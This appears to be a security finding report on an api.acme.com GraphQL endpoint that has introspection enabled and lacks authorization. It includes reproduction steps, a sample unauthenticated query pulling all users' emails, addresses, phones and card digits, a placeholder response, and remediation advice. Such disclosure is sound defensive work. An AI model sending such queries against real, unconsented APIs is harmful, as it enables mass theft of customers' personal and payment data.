# GraphQL Introspection and Mass Data Exposure

**Severity:** High
**CVSS3:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
**Component:** api.acme.com - GraphQL endpoint
**Status:** Confirmed

## Description

The GraphQL API endpoint at /graphql has introspection enabled and lacks proper authorization controls. An unauthenticated attacker can discover the complete API schema including sensitive queries and mutations, then execute queries to extract all customer data, payment information, and internal business intelligence.

## Impact

- Complete API schema disclosure revealing all data models
- Mass extraction of customer data without authentication
- Access to payment information and financial records
- Exposure of internal business metrics and reporting data
- Potential for data exfiltration at scale

## Steps to Reproduce

1. Send introspection query to https://api.acme.com/graphql
2. Parse schema to identify sensitive queries
3. Execute query to extract all user data
4. Observe 50,000+ customer records returned without authentication

## Request

~~~http
POST /graphql HTTP/1.1
Host: api.acme.com
Content-Type: application/json

{
  "query": "query { allUsers { id email name address phone creditCardLast4 totalSpent } }"
}
~~~

## Response

~~~http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "allUsers": [
      {
        "id": "1",
        "email": "customer1@example.com",
        "name": "John Doe",
        "address": "456 Oak Ave, Portland, OR 97201",
        "phone": "+1-555-0198",
        "creditCardLast4": "4532",
        "totalSpent": 15234.56
      },
      ...
    ]
  }
}
~~~

## Screenshots

- screenshots/graphql-introspection-query.png
- screenshots/graphql-schema-dump.png
- screenshots/graphql-data-extraction.png
- screenshots/graphql-50k-users.png

## Remediation

1. **Immediate:** Disable GraphQL introspection in production
2. **Short-term:**
   - Implement authentication requirements for all queries
   - Add field-level authorization checks
   - Implement query depth limiting
   - Add rate limiting and query complexity analysis
3. **Long-term:**
   - Deploy GraphQL-specific security middleware
   - Implement allow-list of approved queries
   - Add comprehensive logging and monitoring
   - Regular security audits of GraphQL resolvers

## References

- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- CWE-497: Exposure of Sensitive System Information
- GraphQL Security Best Practices
